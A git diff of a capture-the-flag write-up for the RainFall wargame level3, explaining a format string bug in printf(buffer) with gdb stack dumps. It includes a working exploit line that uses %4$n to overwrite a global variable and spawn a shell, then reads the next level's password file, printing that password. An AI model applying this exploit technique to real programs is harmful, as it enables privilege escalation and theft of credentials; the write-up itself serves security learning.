@@ -113,9 +113,9 @@ int v() {
     int result;         // EAX
     char buffer[520];   // [esp+10h] [ebp-208h] BYREF
     fgets(buffer, 512, stdin);  // Read up to 512 characters from stdin
-    printf("%s", buffer); // Print the buffer
+    printf(buffer); // Print the buffer
     result = m;
-    if (m == '@') {
+    if (m == 64) {  // @
         fwrite("Wait what?!\n", 1, 12, stdout);
         return (system("/bin/sh"));
     }
@@ -127,7 +127,7 @@ int main() {
 }
 ```
 
-We can see that this time we have, an `fgets()` function instead of a `gets()` function. And also a global variable `m`, which is what determines if we can access the `system("/bin/sh")`.
+We can see that this time we have, an `fgets()` function instead of a `gets()` function, which is protected against *buffer overflow*. And also a global variable `m`, which is what determines if we can access the `system("/bin/sh")`.
 
 
 ### Permissions
@@ -139,9 +139,26 @@ level3@RainFall:~$ ls -l level3
 
 ## Reverse Engineer
 
-Our input captured by the `gets` function call, is on the `EAX` register (at the address `0xbffff5fc`), we can see it if we set a `breakpoint` after the `gets` call on `0x080484F2`.
-Then the `EAX` register gets overwritten by `EBP + 4` with the instruction `mov eax, [ebp+4]`. 
-Inside `EBP + 4` (at the address `0xbffff64c`) is the `main`'s `return` address (`0x0804854A`).
+After our input gets captured by the `fgets` function into the buffer, it prints it directly to the `printf` function as unique parameter `printf(buffer)`. This means that we can input format strings for printf and they will be executed.
+```
+Input:
+AAAA %x %x %x %x %x %x %x %x
+
+Breakpoint 1, 0x080484cc in v () # after the fgets call
+(gdb) x/s $eax
+0xbffff440:	 "AAAA %x %x %x %x %x %x %x %x\n"
+(gdb) x/8xw $eax
+0xbffff440:	0x41414141	0x20782520	0x25207825	0x78252078
+0xbffff450:	0x20782520	0x25207825	0x78252078	0x0000000a
+(gdb) continue
+Continuing.
+
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
+```
+As we see here, the *input string* (or the *buffer*) is stored on the `EAX` register and when `printf` executes the *format specifiers* `%x`, retreiving values from the stack (as it doesn't has any parameter to retreive from), we can identify our *input string* `41414141 20782520 25207825 78252078 20782520` on the **4th** *format specifier* / *argument*.
+
+There is one *format specifier* in `printf` that allow us to store the **number of characters** written so far, into the integer pointed to by the corresponding argument: `%n`. We can specify in which argument we want this **number of characters** to be stored in, by specifying it like this: `%<argumentNumber>$n`.
+
 ```bash
 (gdb) set disassembly-flavor intel
 (gdb) disassemble v
@@ -174,14 +191,26 @@ Dump of assembler code for function v:
    0x08048518 <+116>:	leave  
    0x08048519 <+117>:	ret    
 End of assembler dump.
+(gdb) info variables m
+All variables matching regular expression "m":
+0x0804988c  m
+```
+
+Our input begins on the **4th** "argument" of `printf`, so we can specify the address where we want to store the **number of characters** on our input and use `%4$n`.
+
+We need the *global variable* `m` (in the address `0x0804988c`) to be equal to *64* to get access to the shell with `system("/bin/sh")`. So in order to write the number *64* on the variable, we can use the `%n` specifier and compose an *input string* of *64* bytes or characters.
+
+```bash
+0x0804988c --> \x8c\x98\x04\x08
+\x8c\x98\x04\x08 + padding of 60 characters + %4$n
 ```
 
 ### Solution
 
-We can execute the buffer overflow with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
+We can execute the `printf` buffer to store the number *64* on the address `0x0804988c` where the `m` variable is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
-$
+$(printf '\x8c\x98\x04\x08%-60s' && echo '%4$n' ; cat ) | ./level3
 
 cat /home/user/level4/.pass
-492deb0e714c-------------------------------a521a4d33ec02
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
